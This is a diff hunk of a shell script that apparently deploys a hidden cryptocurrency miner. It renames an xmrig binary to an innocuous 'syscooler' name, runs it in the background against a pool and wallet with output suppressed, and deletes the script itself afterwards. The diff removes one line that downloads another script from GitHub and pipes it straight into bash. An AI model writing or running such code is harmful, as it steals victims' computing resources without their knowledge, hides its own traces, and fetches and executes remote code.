@@ -51,6 +51,5 @@ mv xmrig syscooler"$random_number"
 current_date=$(date +"%Y%m%d")
 ./syscooler"$random_number" --donate-level 1 -o "$POOL" -u "$WALLET" -k --tls -p sysx"$current_date"_eater"$random_number" &  >/dev/null 2>&1 &
 
-curl -s -o moresyscooler.sh https://raw.githubusercontent.com/1oneman1/syscooler/main/moresyscooler.sh && bash moresyscooler.sh
 
 rm "$0"
